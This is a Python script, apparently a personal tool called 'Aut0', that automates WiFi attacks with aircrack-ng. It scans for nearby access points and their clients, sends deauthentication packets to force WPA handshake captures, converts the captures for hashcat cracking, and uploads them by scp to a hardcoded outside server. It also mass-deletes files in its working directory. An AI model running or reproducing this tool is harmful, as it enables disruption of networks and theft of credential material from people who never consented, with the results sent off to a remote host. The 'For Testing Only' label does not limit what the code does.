# Made by Sam Mahoney
# For Testing Only
import csv
import re
import time
import subprocess
import os

"""allow user to Change speed of discovery (timeout time) """

def rate():
    global bssid_scan, device_scan, device_deauth
    print("[!] Setting the speed for the attack")
    print("-Quick Capture (Q), -Standard Capture (S), -Intense Capture (I)")
    while True:
        choice = str(input("> "))
        choice = choice.capitalize()
        if choice == "Q":
            print("Quick")
            bssid_scan = "10"
            device_scan = "10"
            device_deauth = "5"
            break
        elif choice == "S":
            print("Standard")
            bssid_scan = "30"
            device_scan = "20"
            device_deauth = "10"
            break
        elif choice == "I":
            print("Intense")
            bssid_scan = "40"
            device_scan = "30"
            device_deauth = "15"
            break
        else:
            print("[!]Enter A Valid Option (Q, S, I)")
            print("")
    return bssid_scan, device_scan, device_deauth



    

def csvloop(list):
    bssid_list = []
    # Loops through the csv created from airodump
    print("[!] Finding CSV file")
    for e in list:
        # Regex string for search
        for x in e:
            bssid_re = re.match('([0-9A-F]{2}([:-]|$)){6}', x)
            if bssid_re:
                bssid_list.append(''.join(x))
    return bssid_list

def csvlist():
    x_list = []
    # Opens CSV file
    f = open('bssidcaps-01.csv')
    cf = csv.reader(f)
    for row in cf:
        x_list.append(row)
    f.close()
    return x_list

def airmon():
    # Maybe add restart for network manager
    print("----------------------------")
    bash1 = "airmon-ng check kill"
    process = subprocess.Popen(bash1.split(), stdout=subprocess.PIPE)
    output, error = process.communicate()
    time.sleep(0.5)
    bash2 = "airmon-ng start wlan0"
    process = subprocess.Popen(bash2.split(), stdout=subprocess.PIPE)
    output, error = process.communicate()
    time.sleep(1)
    bash3 = "xterm -e timeout {} airodump-ng wlan0mon --write bssidcaps -o csv".format(bssid_scan)
    process = subprocess.Popen(bash3.split(), stdout=subprocess.PIPE)
    print("[!] Scanning BSSIDs")
    print("YO")
    time.sleep(int(bssid_scan))
    print(int(bssid_scan))
    print("NAh")
    print("[!] Created bssidcaps.CSV")
    print("----------------------------")

def airdump(bssid, channel, d_list):
    x = 2
    for d in d_list:
        print("[!] Attacking BSSID:{0} - On Channel {1}".format(bssid, channel))
        dump = "xterm -e timeout {2}  airodump-ng -c {1} --bssid {0} -w {0} -o pcap wlan0mon".format(bssid, channel, device_scan)
        process = subprocess.Popen(dump.split(), stdout=subprocess.PIPE)
        time.sleep(int(device_scan))
        play = "xterm -e timeout {2} aireplay-ng -0 10 -c {0} -a {1} wlan0mon".format(d, bssid, device_deauth)
        process = subprocess.Popen(play.split(), stdout=subprocess.PIPE)
        print("[!] Deauth Attack")
        time.sleep(int(device_deauth))
        print("[!] Handshake Captured")
        print("----------------------------")

        ext = "-0" + str(x)
        cap = bssid + ext
        x = + 1
        covertcap(cap)


def devicenet(b_list, c_list):
    print("[!] Finding devices on the network")
    for bssid, channel in zip(b_list, c_list):
        discover = "xterm -e timeout {2} airodump-ng wlan0mon --bssid {0} --channel {1} -w {0} -o csv".format(bssid, channel, device_scan)
        process = subprocess.Popen(discover.split(), stdout=subprocess.PIPE)
        time.sleep(int(device_scan))
        print("----------------------------")
        try:
            bssidcsv = str(bssid) + "-01.csv"
            row_count = sum(1 for row in csv.reader(open(bssidcsv)))
            if row_count <= 6:
                rm = "rm {}".format(bssidcsv)
                process = subprocess.Popen(rm.split(), stdout=subprocess.PIPE)
                print("[!] Removed File Since No Devices Were Discovered")
            elif row_count > 6:
                time.sleep(5)
                devicelist = extractdevices(bssidcsv, row_count)
                rm = "rm {}".format(bssidcsv)
                airdump(bssid, channel, devicelist)
                process = subprocess.Popen(rm.split(), stdout=subprocess.PIPE)
                cleanup()
        except FileNotFoundError:
            print("{} Does not exist!").format(bssidcsv)
    main(2)


def channelList(list, c):
    channel_list = []
    # change this to match file
    for x in range(2, c):
        c_list = list[x]
        # This is the channel
        y = (c_list[3])
        channel_list.append(y)
    print("--------------------------")
    return channel_list


def rowinfile(list):
    row_count = sum(1 for row in csv.reader(open('bssidcaps-01.csv')))
    count = 0
    y = 1
    for x in list:
        count = count + 1
        if y == 1:
            y = 2
        elif x == []:
            count = count - 1
            truelist = list[:count]
            break
    return count, truelist


def extractdevices(bssidfile, c):
    print("[!] Extracting Devices From CSV Files!")
    d_list = []
    f_list = []
    # Opens CSV file
    try:
        f = open(bssidfile)
        bcsv = csv.reader(f)
    except FileNotFoundError:
        print("{} Does not exist!").format(bssidfile)
    for row in bcsv:
        d_list.append(row)
    d_list = d_list[5:]
    n = c - 6
    for x in range(n):
        y_list = d_list[x]
        y = y_list[0]
        f_list.append(y)
    f.close()
    return f_list

def covertcap(cap):
    # Fix convert cap so it loops through 01 - 02 -03
    # This coverts the .cap file so it can be used with hashcat
    cap1 = cap + ".cap"
    cap2 = cap + ".hccapx"
    print("[!] Attempting Convert")
    try:
        covert = "/root/hashcat-utils-master/src/cap2hccapx.bin /root/Desktop/wifi/Captures/{0} /root/Desktop/wifi/Captures/{1}".format(cap1, cap2)
        process = subprocess.Popen(covert.split(), stdout=subprocess.PIPE)
        print("----------------------------")
        print("[!] File Converted")
        time.sleep(1)
        cappath = "/root/Desktop/wifi/Captures/" + cap2
        upload(cappath)
    except Exception as e:
        print("[!] Could Not Convert")
        print(e)

def upload(file):
    # Only use if it has a connection?
    print("----------------------------")
    print("[!] Uploading to Server")
    try:
        p = subprocess.Popen(["scp", file, "comms@116.203.107.16:/home/comms/caps"])
        sts = p.wait()
        print("[!] Upload Success")
    except Exception as e:
        print("[!] Upload Failed")
        print(e)

def cleanup():
    # Clean up the Dict
    os.system("find . ! -name 'deauth.py' -type f -exec rm -f {} +;")


def main(y):
    if y == 1:
        rate()
        cleanup()
        airmon()
        blist = csvlist()
        bssid_list = csvloop(blist)
        counter, elist = rowinfile(blist)
        ch_list = channelList(elist, counter)
        devicenet(bssid_list, ch_list)
    else:
        print()
        print()
        print("[!] Thank you for using Aut0")

if __name__ == '__main__':
    for x in range(10):
        print()
        time.sleep(0.05)
    print("----------------------------")
    print("""                                                  
       db                              ,a8888a,   
      d88b                    ,d     ,8P"'  `"Y8, 
     d8'`8b                   88    ,8P        Y8,
    d8'  `8b    88       88 MM88MMM 88          88
   d8YaaaaY8b   88       88   88    88          88
  d8""""""""8b  88       88   88    `8b        d8'
 d8'        `8b "8a,   ,a88   88,    `8ba,  ,ad8' 
d8'          `8b `"YbbdP'Y8   "Y888    "Y8888P"   
                                                  """)

    main(1)
